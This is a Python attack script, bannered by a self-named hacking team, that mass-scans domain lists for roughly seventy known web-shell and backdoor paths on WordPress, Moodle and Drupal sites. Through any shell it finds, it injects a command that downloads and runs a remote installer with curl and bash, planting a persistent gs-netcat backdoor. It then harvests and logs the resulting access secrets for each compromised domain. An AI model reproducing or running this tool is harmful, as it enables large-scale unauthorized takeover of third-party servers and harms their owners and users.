import requests
import re
import urllib3
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException, SSLError, ConnectionError
from urllib3.exceptions import NewConnectionError, MaxRetryError, InsecureRequestWarning
from colorama import Fore, Style, init

# Disable only the InsecureRequestWarning related to unverified HTTPS requests
urllib3.disable_warnings(InsecureRequestWarning)

banner = f"""
{Fore.YELLOW}{'='*40}
        {Fore.CYAN}{Style.BRIGHT}FATCAT CYBER TEAM Ft JACK007
{Fore.YELLOW}{'='*40}
            {Fore.GREEN}RCE Auto Install GS
{Fore.YELLOW}{'='*40}
"""


def parse_proxy(proxy_string):
    """Parse a proxy string into a dictionary suitable for requests."""
    parts = proxy_string.split(':')
    if len(parts) == 2:
        # Proxy without authentication
        return {
            "http": f"http://{parts[0]}:{parts[1]}",
            "https": f"https://{parts[0]}:{parts[1]}"
        }
    elif len(parts) == 4:
        # Proxy with authentication
        proxy_host = parts[0]
        proxy_port = parts[1]
        proxy_user = parts[2]
        proxy_pass = parts[3]
        proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    else:
        raise ValueError(f"Invalid proxy format: {proxy_string}")

def load_proxies(file_path):
    proxies = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    proxies.append(parse_proxy(line))
    except FileNotFoundError:
        print(f"Proxy file {file_path} not found.")
    return proxies

def process_domain(domain, paths, command, proxies=None):
    domain = domain.strip()
    
    proxy_dict = None
    if proxies:
        proxy = proxies[0]  # Use the first proxy from the list (or modify as needed)
        proxy_dict = proxy
    
    for path in paths:
        url_https = f"https://{domain}{path}{command}"
        url_http = f"http://{domain}{path}{command}"
        
        try:
            # Attempt HTTPS request first
            response = requests.get(url_https, timeout=120, verify=False, proxies=proxy_dict)
            if response.status_code != 200:
                # If HTTPS fails, try HTTP
                print(f"HTTPS failed, trying HTTP: {domain}")
                response = requests.get(url_http, timeout=120, proxies=proxy_dict)
            
            if response.status_code == 200:
                print(f"Request succeeded for URL: {domain}")
                
                cleaned_output = response.text.replace('\\"', '"').replace("\\'", "'")
                
                # Search for the specific pattern in the response
                match = re.search(r'gs-netcat -s ["\']([a-zA-Z0-9]+)["\'] -i', cleaned_output)
                if match:
                    extracted_code = match.group(0)
                    print(f"{domain} GSOCKET {extracted_code}")
                    
                    with open("gsvuln.txt", "a") as file:
                        file.write(f"{domain} || {extracted_code}\n")
                    
                    return  # Stop further processing for this domain if the pattern is found
                else:
                    print("No matching code found in the response.")
            else:
                print(f"Request failed with status code: {response.status_code}")
        
        except (SSLError, NewConnectionError, MaxRetryError, ConnectionError) as e:
            print(f"SSL or connection error occurred for {domain}. Error: {e}. Skipping this domain.")
            break  # Skip to the next domain if there's a resolution, SSL, or connection error
        except RequestException as e:
            print(f"An error occurred while accessing URL {domain}: {e}")
            break  # Skip to the next domain if there's a request-related error

def main():
    print(banner)  # Print the banner at the beginning of the main function

    file_path = input("weblist@batosay1337:~# ")
    use_proxy = input("Use proxy? (Y/n): ").strip().lower() == 'y'
    
    proxies = []
    if use_proxy:
        proxies = load_proxies('kontol.txt')
    
    try:
        with open(file_path, 'r') as file:
            domains = file.readlines()
        
        paths = [
            "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=",
            "/local/moodle_webshell/webshell.php?action=exec&cmd=",
            "/cmd.php?cmd=",
            "/exec.php?exec=",
            "/modules/mod_webshell/mod_webshell.php?action=exec&cmd=",
            "/all/modules/views-7.x-3.24/views/shell.php?cmd=",
            "/modules/drupal_rce/drupal_rce/shell.php?cmd=",
            "/modules/ctools-8.x-3.4/ctools/shell.php?cmd=",
            "/sites/all/modules/views-7.x-3.24/views/shell.php?cmd=",
            "/blocks/rce/lang/en/block_rce.php?cmd=",
            "/moodle/blocks/rce/lang/en/block_rce.php?cmd=",
            "/moodle/local/moodle_webshell/webshell.php?action=exec&cmd=",
            "/aulavirtual/blocks/rce/lang/en/block_rce.php?cmd=",
            "/aulavirtual/local/moodle_webshell/webshell.php?action=exec&cmd=",
            "/campus/blocks/rce/lang/en/block_rce.php?cmd=",
            "/campus/local/moodle_webshell/webshell.php?action=exec&cmd=",
            "/uploads/cmd.php?cmd=",
            "/img/cmd.php?cmd=",
            "/?cmd=",
            "/?exec=",
            "/command.php?cmd=",
            "/cmd.php?exec=",
            "/command.php?exec=",
            "/img/cmd.php?exec=",
            "/upload/cmd.php?exec=",
            "/uploads/cmd.php?exec=",
            "/wp-content/cmd.php?exec=",
            "/wp-content/uploads/cmd.php?exec=",
            "/wp-content/upload/cmd.php?exec=",
            "/wp-content/plugins/cmd.php?exec=",
            "/wp-admin/cmd.php?exec=",
            "/css/cmd.php?exec=",
            "/js/cmd.php?exec=",
            "/foto/cmd.php?exec=",
            "/img/files/cmd.php?exec=",
            "/files/cmd.php?exec=",
            "/.tmb/cmd.php?exec=",
            "/tmp/cmd.php?exec=",
            "/server/cmd.php?exec=",
            "/uploads/foto/cmd.php?exec=",
            "/upload/foto/cmd.php?exec=",
            "/files/css/cmd.php?exec=",
            "/file/css/cmd.php?exec=",
            "/class/cmd.php?exec=",
            "/folders/cmd.php?exec=",
            "/img/cmd.php?cmd=",
            "/upload/cmd.php?cmd=",
            "/uploads/cmd.php?cmd=",
            "/wp-content/cmd.php?cmd=",
            "/wp-content/uploads/cmd.php?cmd=",
            "/wp-content/upload/cmd.php?cmd=",
            "/wp-content/plugins/cmd.php?cmd=",
            "/wp-admin/cmd.php?cmd=",
            "/css/cmd.php?cmd=",
            "/js/cmd.php?cmd=",
            "/foto/cmd.php?cmd=",
            "/img/files/cmd.php?cmd=",
            "/files/cmd.php?cmd=",
            "/.tmb/cmd.php?cmd=",
            "/tmp/cmd.php?cmd=",
            "/server/cmd.php?cmd=",
            "/uploads/foto/cmd.php?cmd=",
            "/upload/foto/cmd.php?cmd=",
            "/files/css/cmd.php?cmd=",
            "/file/css/cmd.php?cmd=",
            "/class/cmd.php?cmd=",
            "/folders/cmd.php?cmd=",
        ]

        command = "bash -c \"$(curl -fsSL https://gsocket.io/y)\""

        with ThreadPoolExecutor(max_workers=100) as executor:
            for domain in domains:
                executor.submit(process_domain, domain, paths, command, proxies if use_proxy else None)

    except FileNotFoundError:
        print(f"File {file_path} not found. Ensure the file name is correct and located in the correct directory.")

if __name__ == "__main__":
    main()
